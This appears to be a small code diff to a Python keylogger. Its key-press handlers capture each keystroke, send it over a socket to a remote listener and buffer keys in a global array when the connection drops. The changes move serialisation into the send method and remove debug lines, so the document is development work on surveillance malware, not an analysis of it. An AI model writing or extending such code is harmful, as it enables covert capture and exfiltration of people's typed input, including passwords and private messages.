@@ -20,6 +20,7 @@ class Socket:
             pass
 
     def send(self, char):
+        char = dumps(char)
         if self.socket:
             try:
                 self.socket.sendall(char)
@@ -50,9 +51,7 @@ class Socket:
 
 def no_safe_key_press(key):
     key = str(key).replace("'", "")
-    key = dumps(key)
     send = active.send(key)
-    send = True
     if not send:
         Global.key_array.append(key)
         Global.connection = False
@@ -60,7 +59,6 @@ def no_safe_key_press(key):
 
 
 def safe_key_press(key):
-    print("1")
     key = str(key).replace("'", "")
     Global.key_array.append(key)
     Global.i += 1
